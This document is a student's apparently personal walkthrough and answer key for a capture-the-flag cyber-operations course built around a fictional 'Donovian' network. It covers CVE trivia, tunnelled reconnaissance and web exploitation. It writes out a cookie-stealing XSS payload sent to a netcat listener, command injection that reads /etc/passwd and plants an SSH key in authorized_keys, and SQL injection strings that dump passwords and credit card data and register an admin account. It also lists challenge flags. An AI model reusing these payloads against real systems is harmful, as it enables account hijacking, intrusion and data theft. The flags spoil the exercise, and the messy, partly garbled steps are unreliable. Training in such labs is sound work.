## Exploit Research ##

### ASA - WebVPN 2 ###

What CVE is associated with ASA 5500 if WebVPN is enabled on the interface and accessible? (enter only the numbers)

##### Answer ####

CVE-2018-0101

### ASA - Type 2 ###

What type of vulnerability does this CVE address?

 DOS
 Remote Code
 Local privilege esc

##### Answer ####

Remote Code

### ASA – Score 2 ###

The NIST assigned this CVE what base score?

##### Answer ####

10

### ASA – POC 2 ###

There is a proof of concept named crash that was created. What ID was assigned to it by Offensive Security?

##### Answer ####

43986

### Windows - PrintConfig 2 ###

What recent Windows vulnerability dealt with a issue were the user could overwrite the PrintConfig.dll prior to 2019?

Provide only the CVE number

(input numbers only with no spaces or dashes)

##### Answer ####

2018-8440 

### Windows - Smart person 2 ###

What is the name of the person that discovered the vulnerability?

##### Answer ####

SandboxEscaper

### Windows – Method 2 ###

What function/method does this vulnerability take advantage of?

##### Answer ####

SchRpcSetSecurity

### Initial access – Technique 2 ###

Which technique is most used to gain initial access?

##### Answer ####

phishing


## Reconnaissance ##

File Transfer Protocol (FTP) appears to be available within Donovian Cyberspace, perform further reconnaissance and interrogate this service to identify the flag.

### ASA - WebVPN 2 ###

Intelligence believes that not all of the 192.168.28.96/27 network has the ability to communicate with the 192.168.150.224/27 network.

Scheme of Maneuver:
    - Jump Box
    - Network scan: 192.168.28.96/27
    - Network scan:192.168.150.224/27
    - OSs: unknown
    - Creds: student ::
    - Known Ports: unknown
    - Known URL: consulting.site.donovia
    - Known URL: conference.site.donovia
    - Action: Reconnaissance to collect intelligence and identify possible avenues of approach in the network.

##### Answer ####

1. create a dynamic tunnel to the jumpbox -> ssh student@10.50.49.22 -D 9050
2. Run scans to identify available networks -> for i in {97..126} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
3. You will find the hosts... update the diagram to see what your hosts are... 
4. Run nmap scans to see the open ports-> proxychains nmap ip 192.168.28.97-100, 100,105,111,120 -Pn
5. The ip address with the flag was 192.168.28.105, do proxychains wget -r ftp://192.168.28.105 to get the flag. 

Ans -> AHFZyWL1EDPvAis1dVAV

### Key Speaker 5 ###

Intelligence shows that the Donovian Government is preparing for a conference, you have been tasked to collect all information relating to the speakers.

Identify the key individual to find the flag

##### Answer ####

 <div class="col-lg-6 ml-auto order-lg-1">
            <h2 class="text-white mb-4 name" data-aos="fade-left" data-aos-delay="200" style="opacity: .0;">cg84h48SV1JRPhXwdu35</h2>

### STRONG tags5 ###

There is some STRONG text within the Donovian Conference News that needs to be collected. It will provide the flag to our operations.

##### Answer ####

1. Open news.html file search for "STRONG"

### Contact Info 5 ###

Intelligence suggests that the Donovian Consulting Group appears to have sensitive contacts available on their public facing site. Scrape the data and piece together the flag.

##### Answer ####

1. open the contact on Sites and source page.. Ctl f and look for f1aG.

concatenate the flags

1. PrIqP 
4. cn0tj
3. krRzy
2. z9eWC

Ans -> PrIqPz9eWCkrRzycn0tj


### Company Article 5 ###

A company has posted an article to Donovian Consulting Groups blog, Identify the flag associated with the company.

##### Answer ####

See the articles page - file:///home/student/192.168.28.111/index.html. Look through the text and you will find, "You've found" then search for the class until you find the flag. 

ieKbSPharbzzBggAgXwN

### SMB 5 ###

Your team has received intelligence related to Server Message Block being available. Identify the host and associated flag.

Hint
You will need to gain initial access to a system in 192.168.28.96/27 subnet utilizing passwords gathered through recon.

--script

192.168.150.224/27

##### Answer ####

1. From the hosts attached to the jumpbox find out which one has ssh port
2. The hint from the ftp server gave you a file with passwords to try..try those passwords in your ssh connection. 
3. Create local tunnels to each of the boxes that had ssh ports and try accessing them using the credentials. The one that access the connection is obviously the one that you want to run it from. 
4. Do a ping sweep to see which addresses on the box it can connect to. 
5. Utilize the smb ports to and the smd-os-discovery tool from the internet host through the dynamic tunnel 
6. 

student@lin-ops:/usr/share/nmap/scripts$ proxychains nmap –Pn "192.168.28.150" -sC This runs all the default scripts   10.50.40.109------192.168.28.96----------192.168.28.120(donovia-05) 


### TITLE tags 5 ###

Find the Titles of all the hosted web servers, identify the flag.

##### Answer ####

Look through all the title tags and you will find a flag -> 3xFYdsM6ectRMmvR2kkd

## Web Exploitation ##

Donovian Web Exploitation (DWE)
XX OCT 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through network, identify and gain access to Minstry of Industry web servers.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques limited to cross-site scripting, command injection, file upload, and path transversal. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = W3B3xpl01t5t@rt0F@ct1v1ty

Prior Approvals: Development of SSH access on host: Donovian_MI_websvr. Upon identification of additional Minstry web sites, student is authorized browse to pages to collect intellegence to enable answering CTFd challenges.

Scheme of Maneuver:
Jump Box
T1:10.100.28.40

>T1:10.100.28.40

Target Section:

T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.




2. Through website reconnaissance, what is Romanoff's email address? 
Step1: login to jumpbox: ssh@10.50.33.231 
Step2: create a local to T1 student@lin-ops:~$ ssh student@10.50.33.231 -L 50511:10.100.28.40:80 -NT 
Found following ports: PORT     STATE SERVICE 80/tcp   open  http 4444/tcp open  krb524 
Step 3: Create a dynamic to Jump box 
Step4: run –sV to confirm what services are running on it proxychains nmap -Pn -sV 10.100.28.40 
Step5 : Enumerate the website from ops station  student@lin-ps:~$ proxychains nmap -Pn -sT 10.100.28.40 -p 80 --script http-enum.nse
Found above directory Go to all the website I.e http://10.100.28.40/robots.txt There is another directory /net_test. Go to this directory: http://10.100.28.10/net_test Next: http://10.100.28.40/net_test/industry_check.php Next: ticket—we see can go to contract_bids.html


2. Natasha Romanoff has been identified as a major contracting officer for the Ministry. Intelligence suggests that she may have a file on system which will identify which companies are contracted to work on sensitive projects. Investigate Ministry website and identify vulnerabilities which could allow collection through usage of command injection, directory traversal, or unrestricted file upload  Step 1: Here we can see a section called system to ping. Lets check if this allows any pings. In system to ping: 8.8.8.8--- this verifies it does allow ping  Step2: Now to see if this allows any command injection to try few commands on on of the three boxes ; pwd ---- to see the current directory ---- var/www/html/net_test ; whoami – who is logged in --- billybob ; cat /etc/passwd --- to see the password of users  view source page

Found billybob and his current default directory: /bin/bash  And /home/billybob as the main directory ; ls -al /var/www/html --- to view other directories

### Establish a dynamic connection to the jumpbox ###

ssh into your jump box dynamically ->`ssh student@10.50.49.22 -D 9050`

### VIP email address 5 ###

Through website reconnaissance, what is Romanoff's email address?

##### Answer ####

1. use proxychains and nmap to scan for open ports using the given address
    -> `proxychains nmap -Pn --open 10.100.28.40`
2. wget on the http port-> `proxychains wget -r http://10.100.28.40:80`
3. Find out what's running on 4444:
    -> `proxychains nmap -p 4444 -sV 10.100.28.40`
    -> ssh is running on this port so you can ssh to this port 
4. Check the downloaded folder for the robots.txt to see what's allowed to run. 
    -> opening the http://10.100.28.40/net_test/ we see Parent Directory and industry_check.php
    -> Go to the industry_check.php
    -> Click troubleticket. 
    -> open contract_bids.html and your answer will be here 

### Stored Cross Site Scripting (XSS) 8 ###

Intel has found that by policy the Admin must check the Trouble Ticketing system every few minutes. Team lead orders are to "obtain" the Admins cookie.

##### Answer ####

1. Set your listening port with port of your own on the ops machine -> student@lin-ops:~$ nc -knvl 9696
2. Go to from industry check in VIP email address ->  http://10.100.28.40/TT/ticket.php
3. Edit your cross site scripting script to inject your code like below (use your jump-box's ip address):
    <script>document.location="http://10.50.39.223:9696/Cookie_Stealer1.php?username=" + document.cookie;</script>
4. The flag should be displayed from your listening port. 

### Command Injection 1 8 ###

Identify the user that the MI website is running as and relevant information about their user account configuration.

##### Answer ####

1. Go to the industry check page, has forms, that is most vulnerable -> http://10.100.28.40/net_test/industry_check.php
2. find out which of the pages can run commands e.g. ;whoami and look for the output. the second box lists billybob is the user. 
3. Path to test is identified. run 
4. Run `;cat /etc/passwd` to see the password of users 
5. View source page -> to the bottom of the page, you will see you "you found me and the flag .....7H0s83......."

### Basic HTTP Understanding 5 ###

Training Website

We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.

The flag will be dumped when successful

##### Answer ####

proxychains nmap -Pn -sT 10.100.28.40 -p 80 --script http-enum.nse

nmap ip 192.168.28.97-100, 100,105,111,120 -pm


2. Create a local tunnel to 10.100.28.40
    -> check if 4444 is an ssh port, `proxychains nmap -p 4444 -sV 10.100.28.40`
    -> `ssh student@10.50.49.22 -L 1222:10.100.28.40:4444`





3. Create a dynamic tunnel to the jumpbox 
    -> `ssh student@localhost -p 1222 -D 9050`
4. From running `proxychains nmap -Pn -sT 10.100.28.40 -p 80 --script http-enum.nse`
    -> Found

    PORT   STATE SERVICE
    80/tcp open  http
    | http-enum: 
    |   /robots.txt: Robots file
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    |_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'


5. www-data:x:33:33:www-data:/var/www:/bin/bash -> The directory 
6. Find out where the pub directory is -> 


total 52 drwxr-xr-x 7 root root 4096 Apr 19 2022 . drwxrwxr-x 3 root www-data 4096 Apr 19 2022 .. -rw-r--r-- 1 root root 967 Mar 23 2022 Contract_bids.html drwxr-xr-x 2 root root 4096 Dec 13 11:12 TT drwxr-xr-x 2 root root 4096 Apr 19 2022 css -rw-r--r-- 1 root root 263 Mar 23 2022 db_recover.php -rw-r--r-- 1 root root 890 Mar 23 2022 fileUpload.php drwxr-xr-x 2 root root 4096 Apr 19 2022 images -rw-r--r-- 1 root root 2465 Mar 23 2022 index.html drwxr-xr-x 2 root root 4096 Apr 19 2022 net_test -rw-r--r-- 1 root root 34 Mar 23 2022 robots.txt -rw-r--r-- 1 root root 3280 Mar 23 2022 style.css drwxrwxrwx 2 root root 4096 Dec 14 18:15 uploads drwxrwxrwx 2 root root 4096 Dec 14 18:15 uploads


Found billybob and his current default directory: /bin/bash  And /home/billybob as the main directory ; ls -al /var/www/html --- to view other directories


my ssh keys: 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+ShHz+32iRy5PXvEQSEnn3yOK9azmn6tK+Ld8rpJkGg1Oyuq8hpq7YCmbS246hKLGytcqS9QKaC5xYojc/XjkdLzyAh8B1Ji2EPBMkVf2kpkXpS7uoYM0EvMm5j7Q2SakFdeDdLKgAUaY73JBkZmwSxi5GsJz6ZhE/x+92pFNDzcyXs4gyri+ME2ctmxVeSViOBtRONhjSrdTHePKekSPE4eKO4fEKrVFC8/QT7liTjNuCScNnw72TBys+4ZyrcSlj3yyEgs5Rrw3TpgkS+VS/tSpFf2lljuCmU0f/IXLW73q5/JdeiMEQqSFuV2SD2D9P+Eq92ES0HugQUz30yGR


; ls -la /home/billybob/.ssh/

mkdir /home/billybob/.ssh


;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+ShHz+32iRy5PXvEQSEnn3yOK9azmn6tK+Ld8rpJkGg1Oyuq8hpq7YCmbS246hKLGytcqS9QKaC5xYojc/XjkdLzyAh8B1Ji2EPBMkVf2kpkXpS7uoYM0EvMm5j7Q2SakFdeDdLKgAUaY73JBkZmwSxi5GsJz6ZhE/x+92pFNDzcyXs4gyri+ME2ctmxVeSViOBtRONhjSrdTHePKekSPE4eKO4fEKrVFC8/QT7liTjNuCScNnw72TBys+4ZyrcSlj3yyEgs5Rrw3TpgkS+VS/tSpFf2lljuCmU0f/IXLW73q5/JdeiMEQqSFuV2SD2D9P+Eq92ES0HugQUz30yGR" >> /home/billybob/.ssh/authorized_keys



 cat /home/billybob/.ssh/authorized_keys
PHPSESSID:"f2lh61den5tp2k8pvglcua4qii"

 <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>



 Training Website

We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.

The flag will be dumped when successful

# Create a dynamic channel to spin this server up.... tunnel to 9050

10.100.28.55 

Go through the cyber awareness training.... open firefox to view the website.... 



Directory Traversal
5
Level II Challenge
Training Website

Having the ability to now communicate with the training web site, identify any vulnerabilities that could lead to intelligence collection.

Once identified utilize that vulnerability to obtain the flag from where information about user is configured on the system.

There's a form on this site 10.100.28.55 that'll help you answer


Command Injection 2 5

Level II Challenge
Natasha Romanoff has been identified as a major contracting officer for the Ministry. Intelligence suggests that she may have a file on system which will identify which companies are contracted to work on sensitive projects.

Investigate Ministry website and identify vulnerabilities which could allow collection through usage of command injection, directory traversal, or unrestricted file upload

Flag for Basic HTTP Understanding -> g91LjrKECe4IPR1hLRsG

## SQL Injection ##

Web Exploitation SQL
×
THIS HOLIDAY SEASON Grizzled Vet drinks egg nog and opens a letter. "Dear Sir" "It has come to my attention you've been a bad boy." "...events in Krasnovia..." "...Naughty List..." "Love, Santa" WHEN ONE MAN FIND HIMSELF ON THE NAUGHTY LIST... Grizzled Vet: "Yeah, we did some black ops in Krasnovia. Did some things that will haunt me til I die." HE'LL DO WHATEVER IT TAKES... Grizzled Vet: "But it saved lives! WE SAVED LIVES!!!" TO BE NICE. Grizzled Vet: "I'm in." THIS CHRISTMAS Santa's Elf: "It's the server, sir!" PREPARE Santa: "What about it?" TO GET The Elf: "The SQL. It's been..." INJECTED!!! Grizzled Vet: "Looks like my behavior base isn't the only thing left unsanitized" WEB EX 2: THE SeQueL COMING THIS CHRISTMAS TO AN AOR NEAR YOU RATED R FOR REALLY VULNERABLE DATABASES CHECK YOUR LOCAL MAP FOR CHALLENGES

### DNLA Category 5 ###

On the DNLA site identify the flag using the Categories page.
To answer input the characters inside the flag.

##### Answer ####

1. create a dynamic tunnel to the jumpbox
    `ssh student@10.50.49.22 -D 9050`
    `proxychains nmap -Pn --open 10.100.28.48`
2. From running above, we get:
    Nmap scan report for 10.100.28.48
    Host is up (0.0027s latency).
    Not shown: 998 closed ports
    PORT     STATE SERVICE
    80/tcp   open  http
    4444/tcp open  krb524
3. Do wget on this site
    http:

Go to category from the 10.100.28.48 page. 
Go to 1st category 
Modify the url like so http://10.100.28.48/cases/productsCategory.php?category=1 or 1=1
10.100.28.48/cases/productsCategory.php?category=1 


### Tables 5 ###

How many user created tables are able to be identified through Injection of the web database?

 6
 8
 4
 7
 5

##### Answer ####

list out all the tables and determine which ones are user created

To the answer above, append UNION SELECT table_schema,table_name,column_name FROM information_schema.columns to the url, so, http://10.100.28.48/cases/productsCategory.php?category=1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns

Then count the tables from the end of the schematics... so... 

categories, members, orderlines, orders, payments, permissions, products and share, giving 8

### Admin credentials 5 ###

Provide the password for users with administrator access to the DNLA database. To answer input the flag.

##### Answer ####

Write the query to provide the password.... 
http://10.100.28.48/cases/productsCategory.php?category=1 Union select id,username,password from sqlinjection.members

flag: hlvAZnST4LIaGVHvOFx8

### Products 5 ###

Utilizing the Search page on DNLA, identify the vulnerability to find the flag. To answer input only the characters inside the flag.

##### Answer ####

In the search bar search for `ram' or 1='1` provided in the instructions... 
flag will be down in the search

### SQL version 5 ###

Identify the version of the database that DNLA is utilizing.
To answer input the full version.

##### Answer ####

http://10.100.28.48/cases/productsCategory.php?category=1 UNION SELECT @@version, database(),3

### Credit card 5 ###

Utilizing the input field on DNLA budget page, find the flag associated with credit cards. To answer the question enter only the characters inside the flag.

##### Answer ####

Write the query to provide the password.... 
http://10.100.28.48/cases/productsCategory.php?category=1 Union select id,creditcard_number,date from sqlinjection.payments

flag -> TEN48vhlKKeMPvUDdN0F

### Id search 5 ###

Find the flag associated with id 1337.

Hint
Look to the left and look to the right.

##### Answer ####

http://10.100.28.48/cases/productsCategory.php?category=1 union select data,comment,id from sqlinjection.share4

De-encode the value from base 64 becomes OlDr6z4EXBKyjWh3xkeR

### Create an Admin User 8 ###

Using the /cases/register.php page on DNLA create a user with admin permissions, ensuring the firstname is set to Hacker. Once created log in to get the flag.

##### Answer ####

find the vulnerable field by inserting 'ram' or 1='1' to all the fields and looking at the output fields... see the one which one is not a string. 

You will find that the username field is the one that is vulnerable. 

For the first name, put the value as Hacker, the Last name put the value as last name. 

The username is the vulnerable field, insert this code `username123', 'password', 'email', 1);# ` into the username field. Put random input to the password and email fields. 
Click register. 

You will be successfully registered. Now login with username123 and password to get your hash. 

Ans -> JMefAxXw7LVqVyaeaApD